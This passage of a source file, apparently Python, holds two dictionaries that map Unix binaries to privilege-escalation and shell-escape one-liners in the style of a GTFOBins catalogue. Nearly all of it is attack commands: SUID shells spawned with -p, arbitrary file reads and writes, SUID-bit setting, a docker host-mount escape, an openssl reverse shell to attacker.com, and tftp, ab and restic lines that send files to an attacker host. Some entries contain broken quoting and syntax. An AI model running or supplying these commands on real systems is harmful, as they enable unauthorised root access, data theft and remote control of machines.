            "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
        }
    ],
    "rpmverify": [
        {
            "rpmverify --eval '%(/bin/sh 1>&2)'"
        }
    ],
    "rsync": [
        {
            "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
        }
    ],
    "ruby": [
        {
            "ruby -e 'exec \"/bin/sh\"'"
        }
    ],
    "run-mailcap": [
        {
            "run-mailcap --action=view /etc/hosts && /bin/sh",
        }
    ],
    "run-parts": [
        {
            "run-parts --new-session --regex '^sh$' /bin"
        }
    ],
    "runscript": [
        {
            "TF=$(mktemp) && echo '! exec /bin/sh' >$TF && runscript $TF"
        }
    ],
    "rview": [
        {
            "rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        },
        {
            "rview -c ':lua os.execute(\"reset; exec sh\")'",
        }
    ],
    "rvim": [
        {
            "rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        },
        {
            "rvim -c ':lua os.execute(\"reset; exec sh\")'",
        }
    ],
    "sash": [
        {
            "sash"
        }
    ],
    "scanmem": [
        {
            "scanmem && shell /bin/sh"
        }
    ],
    "scp": [
        {
            "TF=$(mktemp) && echo 'sh 0<&2 1>&2' > $TF && chmod +x \"$TF\" && scp -S $TF x y:"
        }
    ],
    "screen": [
        {
            "screen"
        }
    ],
    "script": [
        {
            "script -q /dev/null"
        }
    ],
    "scrot": [
        {
            "scrot -e /bin/sh"
        }
    ],
    "sed": [
        {
            "sed -n '1e exec sh 1>&0' /etc/hosts",
        }
    ],
    "service": [
        {
            "/usr/sbin/service ../../bin/sh"
        }
    ],
    "setarch": [
        {
            "setarch $(arch) /bin/sh"
        }
    ],
    "setlock": [
        {
            "TF=$(mktemp) && setlock $TF /bin/sh"
        }
    ],
    "sftp": [
        {
            "RHOST=user@attacker.com && sftp $RHOST && /bin/sh"
        }
    ],
    "sg": [
        {
            "sg $(id -ng)"
        }
    ],
    "slsh": [
        {
            "slsh -e 'system(\"/bin/sh\")'"
        }
    ],
    "smbclient": [
        {
            "smbclient '\\\\attacker\\share' && /bin/sh"
        }
    ],
    "socat": [
        {
            "socat stdin exec:/bin/sh",
        }
    ],
    "softlimit": [
        {
            "softlimit /bin/sh"
        }
    ],
    "sort": [
        {
            "LFILE=file_to_read && sort -m \"$LFILE\""
        }
    ],
    "split": [
        {
            "split --filter=/bin/sh /dev/stdin",
        }
    ],
    "sqlite3": [
        {
            "sqlite3 /dev/null '.shell /bin/sh'"
        }
    ],
    "sqlmap": [
        {
            "sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""
        }
    ],
    "ss": [
        {
            "LFILE=file_to_read && ss -a -F $LFILE"
        }
    ],
    "ssh": [
        {
            "ssh localhost $SHELL --noprofile --norc",
        },
        {
            "ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
        },
        {
            "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host",
        }
    ],
    "ssh-agent": [
        {
            "ssh-agent /bin/sh"
        }
    ],
    "sshpass": [
        {
            "sshpass /bin/sh"
        }
    ],
    "start-stop-daemon": [
        {
            "start-stop-daemon -n $RANDOM -S -x /bin/sh"
        }
    ],
    "stdbuf": [
        {
            "stdbuf -i0 /bin/sh"
        }
    ],
    "strace": [
        {
            "strace -o /dev/null /bin/sh"
        }
    ],
    "tar": [
        {
            "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
        },
        {
            "tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'"
        },
        {
            "TF=$(mktemp) && echo '/bin/sh 0<&1' > \"$TF\" && tar cf \"$TF.tar\" \"$TF\" && tar xf \"$TF.tar\" --to-command sh && rm \"$TF\"*"
        }
    ],
    "task": [
        {
            "task execute /bin/sh"
        }
    ],
    "taskset": [
        {
            "taskset 1 /bin/sh"
        }
    ],
    "tasksh": [
        {
            "tasksh && /bin/sh"
        }
    ],
    "tclsh": [
        {
            "tclsh && exec /bin/sh <@stdin >@stdout 2>@stderr"
        }
    ],
    "tdbtool": [
        {
            "tdbtool && ! /bin/sh"
        }
    ],
    "telnet": [
        {
            "RHOST=attacker.com && RPORT=12345 && telnet $RHOST $RPORT && ^] && /bin/sh",
        }
    ],
    "tex": [
        {
            "tex --shell-escape '\\write18{/bin/sh}\\end'"
        }
    ],
    "time": [
        {
            "/usr/bin/time /bin/sh"
        }
    ],
    "timedatectl": [
        {
            "timedatectl list-timezones && /bin/sh"
        }
    ],
    "timeout": [
        {
            "timeout 7d /bin/sh"
        }
    ],
    "tmate": [
        {
            "tmate -c /bin/sh"
        }
    ],
    "tmux": [
        {
            "tmux"
        },
        {
            "tmux -S /path/to/socket_name"
        }
    ],
    "top": [
        {
            "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/.config/procps/toprc && top && # press return twice && reset",
        }
    ],
    "torify": [
        {
            "torify /bin/sh"
        }
    ],
    "torsocks": [
        {
            "torsocks /bin/sh"
        }
    ],
    "tshark": [
        {
            "TF=$(mktemp) && echo 'os.execute(\"/bin/sh\")' >$TF && tshark -Xlua_script:$TF"
        }
    ],
    "unshare": [
        {
            "unshare /bin/sh"
        }
    ],
    "vagrant": [
        {
            "cd $(mktemp -d) && echo 'exec \"/bin/sh\"' > Vagrantfile && vagrant up"
        }
    ],
    "valgrind": [
        {
            "valgrind /bin/sh"
        }
    ],
    "vi": [
        {
            "vi -c ':!/bin/sh' /dev/null"
        },
        {
            "vi :set shell=/bin/sh :shell"
        }
    ],
    "view": [
        {
            "view -c ':!/bin/sh'"
        },
        {
            "view :set shell=/bin/sh :shell",
        },
        {
            "view -c ':py import os; os.execl(\"/bin/sh", "sh", "-c", "reset; exec sh\")'",
        },
        {
            "view -c ':lua os.execute(\"reset; exec sh\")'",
        }
    ],
    "vim": [
        {
            "vim -c ':!/bin/sh'"
        },
        {
            "vim --cmd ':set shell=/bin/sh|:shell'",
        },
        {
            "vim -c ':py import os; os.execl(\"/bin/sh", "sh", "-c", "reset; exec sh\")'",
        },
        {
            "vim -c ':lua os.execute(\"reset; exec sh\")'",
        }
    ],
    "vimdiff": [
        {
            "vimdiff -c ':!/bin/sh'"
        },
        {
            "vimdiff --cmd ':set shell=/bin/sh|:shell'",
        },
        {
            "vimdiff -c ':py import os; os.execl(\"/bin/sh", "sh", "-c", "reset; exec sh\")'",
        },
        {
            "vimdiff -c ':lua os.execute(\"reset; exec sh\")'",
        }
    ],
    "volatility": [
        {
            "volatility -f file.dump volshell && __import__('os').system('/bin/sh')"
        }
    ],
    "watch": [
        {
            "watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
        }
    ],
    "wget": [
        {
            "TF=$(mktemp) && chmod +x $TF && echo -e '#!/bin/sh\ && /bin/sh 1>&0' >$TF && wget --use-askpass=$TF 0"
        }
    ],
    "wish": [
        {
            "wish && exec /bin/sh <@stdin >@stdout 2>@stderr"
        }
    ],
    "xargs": [
        {
            "xargs -a /dev/null sh",
        },
        {
            "echo x | xargs -Iy sh -c 'exec sh 0<&1'",
        },
        {
            "xargs -Ix sh -c 'exec sh 0<&1' x^D^D",
        }
    ],
    "xdg-user-dir": [
        {
            "xdg-user-dir '}; /bin/sh #'"
        }
    ],
    "xdotool": [
        {
            "xdotool exec --sync /bin/sh"
        }
    ],
    "xelatex": [
        {
            "xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
        }
    ],
    "xetex": [
        {
            "xetex --shell-escape '\\write18{/bin/sh}\\end'"
        }
    ],
    "yarn": [
        {
            "yarn exec /bin/sh"
        },
        {
            "TF=$(mktemp -d) && echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json && yarn --cwd $TF install"
        }
    ],
    "yash": [
        {
            "yash"
        }
    ],
    "zathura": [
        {
            "zathura && :! /bin/sh -c 'exec /bin/sh 0<&1'"
        }
    ],
    "zip": [
        {
            "TF=$(mktemp -u) && zip $TF /etc/hosts -T -TT 'sh #' && rm $TF"
        }
    ],
    "zsh": [
        {
            "zsh"
        }
    ],
    "zypper": [
        {
            "zypper x",
        },
        {
            "TF=$(mktemp -d) && cp /bin/sh $TF/zypper-x && export PATH=$TF:$PATH && zypper x",
        }
    ]
}
# SHELL_BINS_END

# SUID_BINS_START
suid_bins = {
    "aa-exec": [
        {
            "./aa-exec /bin/sh -p"
        }
    ],
    "ab": [
        {
            "URL=http://attacker.com/ && LFILE=file_to_send && ./ab -p $LFILE $URL",
        }
    ],
    "agetty": [
        {
            "./agetty -o -p -l /bin/sh -a root tty"
        }
    ],
    "alpine": [
        {
            "LFILE=file_to_read && ./alpine -F \"$LFILE\""
        }
    ],
    "ar": [
        {
            "TF=$(mktemp -u) && LFILE=file_to_read && ./ar r \"$TF\" \"$LFILE\" && cat \"$TF\""
        }
    ],
    "arj": [
        {
            "TF=$(mktemp -d) && LFILE=file_to_write && LDIR=where_to_write && echo DATA >\"$TF/$LFILE\" && arj a \"$TF/a\" \"$TF/$LFILE\" && ./arj e \"$TF/a\" $LDIR",
        }
    ],
    "arp": [
        {
            "LFILE=file_to_read && ./arp -v -f \"$LFILE\""
        }
    ],
    "as": [
        {
            "LFILE=file_to_read && ./as @$LFILE"
        }
    ],
    "ascii-xfr": [
        {
            "LFILE=file_to_read && ./ascii-xfr -ns \"$LFILE\""
        }
    ],
    "ash": [
        {
            "./ash"
        }
    ],
    "aspell": [
        {
            "LFILE=file_to_read && ./aspell -c \"$LFILE\""
        }
    ],
    "atobm": [
        {
            "LFILE=file_to_read && ./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"
        }
    ],
    "awk": [
        {
            "LFILE=file_to_read && ./awk '//' \"$LFILE\""
        }
    ],
    "base32": [
        {
            "LFILE=file_to_read && base32 \"$LFILE\" | base32 --decode"
        }
    ],
    "base64": [
        {
            "LFILE=file_to_read && ./base64 \"$LFILE\" | base64 --decode"
        }
    ],
    "basenc": [
        {
            "LFILE=file_to_read && basenc --base64 $LFILE | basenc -d --base64"
        }
    ],
    "basez": [
        {
            "LFILE=file_to_read && ./basez \"$LFILE\" | basez --decode"
        }
    ],
    "bash": [
        {
            "./bash -p"
        }
    ],
    "bc": [
        {
            "LFILE=file_to_read && ./bc -s $LFILE && quit"
        }
    ],
    "bridge": [
        {
            "LFILE=file_to_read && ./bridge -b \"$LFILE\""
        }
    ],
    "busctl": [
        {
            "./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'"
        }
    ],
    "busybox": [
        {
            "./busybox sh",
        }
    ],
    "bzip2": [
        {
            "LFILE=file_to_read && ./bzip2 -c $LFILE | bzip2 -d"
        }
    ],
    "cabal": [
        {
            "./cabal exec -- /bin/sh -p"
        }
    ],
    "capsh": [
        {
            "./capsh --gid=0 --uid=0 --"
        }
    ],
    "cat": [
        {
            "LFILE=file_to_read && ./cat \"$LFILE\""
        }
    ],
    "chmod": [
        {
            "LFILE=file_to_change && ./chmod 6777 $LFILE"
        }
    ],
    "choom": [
        {
            "./choom -n 0 -- /bin/sh -p"
        }
    ],
    "chown": [
        {
            "LFILE=file_to_change && ./chown $(id -un):$(id -gn) $LFILE"
        }
    ],
    "chroot": [
        {
            "./chroot / /bin/sh -p"
        }
    ],
    "clamscan": [
        {
            "LFILE=file_to_read && TF=$(mktemp -d) && touch $TF/empty.yara && ./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'"
        }
    ],
    "cmp": [
        {
            "LFILE=file_to_read && ./cmp $LFILE /dev/zero -b -l"
        }
    ],
    "column": [
        {
            "LFILE=file_to_read && ./column $LFILE"
        }
    ],
    "comm": [
        {
            "LFILE=file_to_read && comm $LFILE /dev/null 2>/dev/null"
        }
    ],
    "cp": [
        {
            "LFILE=file_to_write && echo \"DATA\" | ./cp /dev/stdin \"$LFILE\""
        },
        {
            "LFILE=file_to_write && TF=$(mktemp) && echo \"DATA\" > $TF && ./cp $TF $LFILE",
        },
        {
            "LFILE=file_to_change && ./cp --attributes-only --preserve=all ./cp \"$LFILE\"",
        }
    ],
    "cpio": [
        {
            "LFILE=file_to_read && TF=$(mktemp -d) && echo \"$LFILE\" | ./cpio -R $UID -dp $TF && cat \"$TF/$LFILE\"",
        },
        {
            "LFILE=file_to_write && LDIR=where_to_write && echo DATA >$LFILE && echo $LFILE | ./cpio -R 0:0 -p $LDIR",
        }
    ],
    "cpulimit": [
        {
            "./cpulimit -l 100 -f -- /bin/sh -p"
        }
    ],
    "csh": [
        {
            "./csh -b"
        }
    ],
    "csplit": [
        {
            "LFILE=file_to_read && csplit $LFILE 1 && cat xx01"
        }
    ],
    "csvtool": [
        {
            "LFILE=file_to_read && ./csvtool trim t $LFILE"
        }
    ],
    "cupsfilter": [
        {
            "LFILE=file_to_read && ./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"
        }
    ],
    "curl": [
        {
            "URL=http://attacker.com/file_to_get && LFILE=file_to_save && ./curl $URL -o $LFILE",
        }
    ],
    "cut": [
        {
            "LFILE=file_to_read && ./cut -d \"\" -f1 \"$LFILE\""
        }
    ],
    "dash": [
        {
            "./dash -p"
        }
    ],
    "date": [
        {
            "LFILE=file_to_read && ./date -f $LFILE"
        }
    ],
    "dd": [
        {
            "LFILE=file_to_write && echo \"data\" | ./dd of=$LFILE"
        }
    ],
    "debugfs": [
        {
            "./debugfs && /bin/sh"
        }
    ],
    "dialog": [
        {
            "LFILE=file_to_read && ./dialog --textbox \"$LFILE\" 0 0"
        }
    ],
    "diff": [
        {
            "LFILE=file_to_read && ./diff --line-format=%L /dev/null $LFILE"
        }
    ],
    "dig": [
        {
            "LFILE=file_to_read && ./dig -f $LFILE"
        }
    ],
    "distcc": [
        {
            "./distcc /bin/sh -p"
        }
    ],
    "dmsetup": [
        {
            "./dmsetup create base <<EOF && 0 3534848 linear /dev/loop0 94208 && EOF && ./dmsetup ls --exec '/bin/sh -p -s'"
        }
    ],
    "docker": [
        {
            "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        }
    ],
    "dosbox": [
        {
            "LFILE='\\path\\to\\file_to_write' && ./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit",
        }
    ],
    "ed": [
        {
            "./ed file_to_read && ,p && q"
        }
    ],
    "efax": [
        {
            "LFILE=file_to_read && ./efax -d \"$LFILE\""
        }
    ],
    "elvish": [
        {
            "./elvish"
        }
    ],
    "emacs": [
        {
            "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
        }
    ],
    "env": [
        {
            "./env /bin/sh -p"
        }
    ],
    "eqn": [
        {
            "LFILE=file_to_read && ./eqn \"$LFILE\""
        }
    ],
    "espeak": [
        {
            "LFILE=file_to_read && ./espeak -qXf \"$LFILE\""
        }
    ],
    "expand": [
        {
            "LFILE=file_to_read && ./expand \"$LFILE\""
        }
    ],
    "expect": [
        {
            "./expect -c 'spawn /bin/sh -p;interact'"
        }
    ],
    "file": [
        {
            "LFILE=file_to_read && ./file -f $LFILE",
        }
    ],
    "find": [
        {
            "./find . -exec /bin/sh -p \\; -quit"
        }
    ],
    "fish": [
        {
            "./fish"
        }
    ],
    "flock": [
        {
            "./flock -u / /bin/sh -p"
        }
    ],
    "fmt": [
        {
            "LFILE=file_to_read && ./fmt -999 \"$LFILE\"",
        }
    ],
    "fold": [
        {
            "LFILE=file_to_read && ./fold -w99999999 \"$LFILE\""
        }
    ],
    "gawk": [
        {
            "LFILE=file_to_read && ./gawk '//' \"$LFILE\""
        }
    ],
    "gcore": [
        {
            "./gcore $PID"
        }
    ],
    "gdb": [
        {
            "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit",
        }
    ],
    "genie": [
        {
            "./genie -c '/bin/sh'"
        }
    ],
    "genisoimage": [
        {
            "LFILE=file_to_read && ./genisoimage -sort \"$LFILE\"",
        }
    ],
    "gimp": [
        {
            "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
        }
    ],
    "grep": [
        {
            "LFILE=file_to_read && ./grep '' $LFILE"
        }
    ],
    "gtester": [
        {
            "TF=$(mktemp) && echo '#!/bin/sh -p' > $TF && echo 'exec /bin/sh -p 0<&1' >> $TF && chmod +x $TF && sudo gtester -q $TF"
        }
    ],
    "gzip": [
        {
            "LFILE=file_to_read && ./gzip -f $LFILE -t"
        }
    ],
    "hd": [
        {
            "LFILE=file_to_read && ./hd \"$LFILE\""
        }
    ],
    "head": [
        {
            "LFILE=file_to_read && ./head -c1G \"$LFILE\""
        }
    ],
    "hexdump": [
        {
            "LFILE=file_to_read && ./hexdump -C \"$LFILE\""
        }
    ],
    "highlight": [
        {
            "LFILE=file_to_read && ./highlight --no-doc --failsafe \"$LFILE\""
        }
    ],
    "hping3": [
        {
            "./hping3 && /bin/sh -p"
        }
    ],
    "iconv": [
        {
            "LFILE=file_to_read && ./iconv -f 8859_1 -t 8859_1 \"$LFILE\""
        }
    ],
    "install": [
        {
            "LFILE=file_to_change && TF=$(mktemp) && ./install -m 6777 $LFILE $TF"
        }
    ],
    "ionice": [
        {
            "./ionice /bin/sh -p"
        }
    ],
    "ip": [
        {
            "LFILE=file_to_read && ./ip -force -batch \"$LFILE\""
        },
        {
            "./ip netns add foo && ./ip netns exec foo /bin/sh -p && ./ip netns delete foo",
        }
    ],
    "ispell": [
        {
            "./ispell /etc/passwd && /bin/sh -p"
        }
    ],
    "jjs": [
        {
            "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs",
        }
    ],
    "join": [
        {
            "LFILE=file_to_read && ./join -a 2 /dev/null $LFILE"
        }
    ],
    "jq": [
        {
            "LFILE=file_to_read && ./jq -Rr . \"$LFILE\""
        }
    ],
    "jrunscript": [
        {
            "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\"",
        }
    ],
    "julia": [
        {
            "./julia -e 'run(`/bin/sh -p`)'"
        }
    ],
    "ksh": [
        {
            "./ksh -p"
        }
    ],
    "ksshell": [
        {
            "LFILE=file_to_read && ./ksshell -i $LFILE"
        }
    ],
    "kubectl": [
        {
            "LFILE=dir_to_serve && ./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
        }
    ],
    "ld.so": [
        {
            "./ld.so /bin/sh -p"
        }
    ],
    "less": [
        {
            "./less file_to_read"
        }
    ],
    "links": [
        {
            "LFILE=file_to_read && ./links \"$LFILE\""
        }
    ],
    "logsave": [
        {
            "./logsave /dev/null /bin/sh -i -p"
        }
    ],
    "look": [
        {
            "LFILE=file_to_read && ./look '' \"$LFILE\""
        }
    ],
    "lua": [
        {
            "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
        }
    ],
    "make": [
        {
            "COMMAND='/bin/sh -p' && ./make -s --eval=$'x:\ && \\t-'\"$COMMAND\""
        }
    ],
    "mawk": [
        {
            "LFILE=file_to_read && ./mawk '//' \"$LFILE\""
        }
    ],
    "minicom": [
        {
            "./minicom -D /dev/null",
        }
    ],
    "more": [
        {
            "./more file_to_read"
        }
    ],
    "mosquitto": [
        {
            "LFILE=file_to_read && ./mosquitto -c \"$LFILE\""
        }
    ],
    "msgattrib": [
        {
            "LFILE=file_to_read && ./msgattrib -P $LFILE"
        }
    ],
    "msgcat": [
        {
            "LFILE=file_to_read && ./msgcat -P $LFILE"
        }
    ],
    "msgconv": [
        {
            "LFILE=file_to_read && ./msgconv -P $LFILE"
        }
    ],
    "msgfilter": [
        {
            "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'",
        }
    ],
    "msgmerge": [
        {
            "LFILE=file_to_read && ./msgmerge -P $LFILE /dev/null"
        }
    ],
    "msguniq": [
        {
            "LFILE=file_to_read && ./msguniq -P $LFILE"
        }
    ],
    "multitime": [
        {
            "./multitime /bin/sh -p"
        }
    ],
    "mv": [
        {
            "LFILE=file_to_write && TF=$(mktemp) && echo \"DATA\" > $TF && ./mv $TF $LFILE"
        }
    ],
    "nasm": [
        {
            "LFILE=file_to_read && ./nasm -@ $LFILE"
        }
    ],
    "nawk": [
        {
            "LFILE=file_to_read && ./nawk '//' \"$LFILE\""
        }
    ],
    "ncftp": [
        {
            "./ncftp && /bin/sh -p"
        }
    ],
    "nft": [
        {
            "LFILE=file_to_read && ./nft -f \"$LFILE\""
        }
    ],
    "nice": [
        {
            "./nice /bin/sh -p"
        }
    ],
    "nl": [
        {
            "LFILE=file_to_read && ./nl -bn -w1 -s '' $LFILE"
        }
    ],
    "nm": [
        {
            "LFILE=file_to_read && ./nm @$LFILE"
        }
    ],
    "nmap": [
        {
            "LFILE=file_to_write && ./nmap -oG=$LFILE DATA",
        }
    ],
    "node": [
        {
            "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'"
        }
    ],
    "nohup": [
        {
            "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
        }
    ],
    "ntpdate": [
        {
            "LFILE=file_to_read && ./ntpdate -a x -k $LFILE -d localhost"
        }
    ],
    "od": [
        {
            "LFILE=file_to_read && ./od -An -c -w9999 \"$LFILE\""
        }
    ],
    "openssl": [
        {
            "RHOST=attacker.com && RPORT=12345 && mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s",
        },
        {
            "LFILE=file_to_write && echo DATA | openssl enc -out \"$LFILE\""
        }
    ],
    "openvpn": [
        {
            "./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'"
        },
        {
            "LFILE=file_to_read && ./openvpn --config \"$LFILE\"",
        }
    ],
    "pandoc": [
        {
            "LFILE=file_to_write && echo DATA | ./pandoc -t plain -o \"$LFILE\""
        }
    ],
    "paste": [
        {
            "LFILE=file_to_read && paste $LFILE"
        }
    ],
    "perf": [
        {
            "./perf stat /bin/sh -p"
        }
    ],
    "perl": [
        {
            "./perl -e 'exec \"/bin/sh\";'"
        }
    ],
    "pexec": [
        {
            "./pexec /bin/sh -p"
        }
    ],
    "pg": [
        {
            "./pg file_to_read"
        }
    ],
    "php": [
        {
            "CMD=\"/bin/sh\" && ./php -r \"pcntl_exec('/bin/sh', ['-p']);\""
        }
    ],
    "pidstat": [
        {
            "COMMAND=id && ./pidstat -e $COMMAND"
        }
    ],
    "pr": [
        {
            "LFILE=file_to_read && pr -T $LFILE"
        }
    ],
    "ptx": [
        {
            "LFILE=file_to_read && ./ptx -w 5000 \"$LFILE\""
        }
    ],
    "python": [
        {
            "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
        }
    ],
    "rc": [
        {
            "./rc -c '/bin/sh -p'"
        }
    ],
    "readelf": [
        {
            "LFILE=file_to_read && ./readelf -a @$LFILE"
        }
    ],
    "restic": [
        {
            "RHOST=attacker.com && RPORT=12345 && LFILE=file_or_dir_to_get && NAME=backup_name && ./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""
        }
    ],
    "rev": [
        {
            "LFILE=file_to_read && ./rev $LFILE | rev"
        }
    ],
    "rlwrap": [
        {
            "./rlwrap -H /dev/null /bin/sh -p"
        }
    ],
    "rsync": [
        {
            "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
        }
    ],
    "rtorrent": [
        {
            "echo \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc && ./rtorrent"
        }
    ],
    "run-parts": [
        {
            "./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
        }
    ],
    "rview": [
        {
            "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
        }
    ],
    "rvim": [
        {
            "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
        }
    ],
    "sash": [
        {
            "./sash"
        }
    ],
    "scanmem": [
        {
            "./scanmem && shell /bin/sh"
        }
    ],
    "sed": [
        {
            "LFILE=file_to_read && ./sed -e '' \"$LFILE\""
        }
    ],
    "setarch": [
        {
            "./setarch $(arch) /bin/sh -p"
        }
    ],
    "setfacl": [
        {
            "LFILE=file_to_change && USER=somebody && ./setfacl -m u:$USER:rwx $LFILE"
        }
    ],
    "setlock": [
        {
            "./setlock - /bin/sh -p"
        }
    ],
    "shuf": [
        {
            "LFILE=file_to_write && ./shuf -e DATA -o \"$LFILE\"",
        }
    ],
    "soelim": [
        {
            "LFILE=file_to_read && ./soelim \"$LFILE\""
        }
    ],
    "softlimit": [
        {
            "./softlimit /bin/sh -p"
        }
    ],
    "sort": [
        {
            "LFILE=file_to_read && ./sort -m \"$LFILE\""
        }
    ],
    "sqlite3": [
        {
            "LFILE=file_to_read && sqlite3 << EOF && CREATE TABLE t(line TEXT); && .import $LFILE t && SELECT * FROM t; && EOF"
        }
    ],
    "ss": [
        {
            "LFILE=file_to_read && ./ss -a -F $LFILE"
        }
    ],
    "ssh-agent": [
        {
            "./ssh-agent /bin/ -p"
        }
    ],
    "ssh-keygen": [
        {
            "./ssh-keygen -D ./lib.so",
        }
    ],
    "ssh-keyscan": [
        {
            "LFILE=file_to_read && ./ssh-keyscan -f $LFILE"
        }
    ],
    "sshpass": [
        {
            "./sshpass /bin/sh -p"
        }
    ],
    "start-stop-daemon": [
        {
            "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
        }
    ],
    "stdbuf": [
        {
            "./stdbuf -i0 /bin/sh -p"
        }
    ],
    "strace": [
        {
            "./strace -o /dev/null /bin/sh -p"
        }
    ],
    "strings": [
        {
            "LFILE=file_to_read && ./strings \"$LFILE\""
        }
    ],
    "sysctl": [
        {
            "COMMAND='/bin/sh -c id>/tmp/id' && ./sysctl \"kernel.core_pattern=|$COMMAND\" && sleep 9999 & && kill -QUIT $! && cat /tmp/id"
        }
    ],
    "systemctl": [
        {
            "TF=$(mktemp).service && echo '[Service] && Type=oneshot && ExecStart=/bin/sh -c \"id > /tmp/output\" && [Install] && WantedBy=multi-user.target' > $TF && ./systemctl link $TF && ./systemctl enable --now $TF"
        }
    ],
    "tac": [
        {
            "LFILE=file_to_read && ./tac -s 'RANDOM' \"$LFILE\""
        }
    ],
    "tail": [
        {
            "LFILE=file_to_read && ./tail -c1G \"$LFILE\""
        }
    ],
    "taskset": [
        {
            "./taskset 1 /bin/sh -p"
        }
    ],
    "tbl": [
        {
            "LFILE=file_to_read && ./tbl $LFILE"
        }
    ],
    "tclsh": [
        {
            "./tclsh && exec /bin/sh -p <@stdin >@stdout 2>@stderr"
        }
    ],
    "tee": [
        {
            "LFILE=file_to_write && echo DATA | ./tee -a \"$LFILE\""
        }
    ],
    "terraform": [
        {
            "./terraform console && file(\"file_to_read\")"
        }
    ],
    "tftp": [
        {
            "RHOST=attacker.com && ./tftp $RHOST && put file_to_send",
        }
    ],
    "tic": [
        {
            "LFILE=file_to_read && ./tic -C \"$LFILE\""
        }
    ],
    "time": [
        {
            "./time /bin/sh -p"
        }
    ],
    "timeout": [
        {
            "./timeout 7d /bin/sh -p"
        }
    ],
    "troff": [
        {
            "LFILE=file_to_read && ./troff $LFILE"
        }
    ],
    "ul": [
        {
            "LFILE=file_to_read && ./ul \"$LFILE\""
        }
    ],
    "unexpand": [
        {
            "LFILE=file_to_read && ./unexpand -t99999999 \"$LFILE\""
        }
    ],
    "uniq": [
        {
            "LFILE=file_to_read && ./uniq \"$LFILE\""
        }
    ],
    "unshare": [
        {
            "./unshare -r /bin/sh"
        }
    ],
    "unsquashfs": [
        {
            "./unsquashfs shell && ./squashfs-root/sh -p"
        }
    ],
    "unzip": [
        {
            "./unzip -K shell.zip && ./sh -p"
        }
    ],
    "update-alternatives": [
        {
            "LFILE=/path/to/file_to_write && TF=$(mktemp) && echo DATA >$TF && ./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0",
        }
    ],
    "uudecode": [
        {
            "LFILE=file_to_read && uuencode \"$LFILE\" /dev/stdout | uudecode"
        }
    ],
    "uuencode": [
        {
            "LFILE=file_to_read && uuencode \"$LFILE\" /dev/stdout | uudecode"
        }
    ],
    "vagrant": [
        {
            "cd $(mktemp -d) && echo 'exec \"/bin/sh -p\"' > Vagrantfile && vagrant up"
        }
    ],
    "varnishncsa": [
        {
            "LFILE=file_to_write && ./varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\""
        }
    ],
    "view": [
        {
            "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
        }
    ],
    "vigr": [
        {
            "./vigr"
        }
    ],
    "vim": [
        {
            "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
        }
    ],
    "vimdiff": [
        {
            "./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
        }
    ],
    "vipw": [
        {
            "./vipw"
        }
    ],
    "w3m": [
        {
            "LFILE=file_to_read && ./w3m \"$LFILE\" -dump"
        }
    ],
